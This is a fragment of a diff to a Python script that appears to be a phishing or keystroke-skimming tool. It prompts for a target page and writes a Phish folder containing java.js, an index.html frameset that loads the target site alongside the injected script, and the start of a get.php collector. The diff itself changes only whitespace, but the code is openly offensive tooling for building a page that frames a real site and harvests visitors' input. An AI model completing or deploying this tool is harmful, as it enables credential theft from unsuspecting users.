@@ -14,7 +14,6 @@ def draw():
     print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
     print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
     print("""                                 |__/  """+S11)
-
 def clear(numlines=100):
   print(S10)
   if os.name == "posix":
@@ -28,7 +27,6 @@ def clear(numlines=100):
   else:
     print('\n' * numlines)
     draw()
-
 clear()
 target = input(S12+'Target Page > '+S10)
 w = open("Phish/java.js", "w")
@@ -48,9 +46,7 @@ window.setInterval(function() {
 """)
 w.close()
 f = open("Phish/index.html", "w")
-f.write("""
-
-<html>
+f.write("""<html>
 <head>
 <script src="java.js"></script>
 </head>
@@ -67,9 +63,7 @@ if(window != top) {
 	Sorry, your browser does not support this site.
 	</noframes>
 </frameset>
-</html>
-
-""")
+</html>""")
 f.close()
 z = open("Phish/get.php", "w")
 z.write("""
